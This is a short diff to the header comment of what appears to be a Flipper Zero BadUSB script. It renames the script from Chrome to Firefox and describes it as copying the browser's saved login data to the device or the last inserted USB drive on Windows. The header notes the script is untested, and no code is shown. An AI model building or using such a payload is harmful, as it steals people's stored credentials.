@@ -1,8 +1,8 @@
 REM_BLOCK
 
- Title: 		PSChromeCopy_FlipImg
+ Title: 		PSFirefoxCopy_FlipImg
  Author: 		aves-frog
- Description: 	Copies Chrome Login Data to flipper img/Last inserted USB
+ Description: 	Copies Firefox Login Data to flipper img/Last inserted USB
  Target:		Windows 10+
  
  IMPORTANT:		This script is based on theoretical function and the official Firefox documentation, this has not been tested
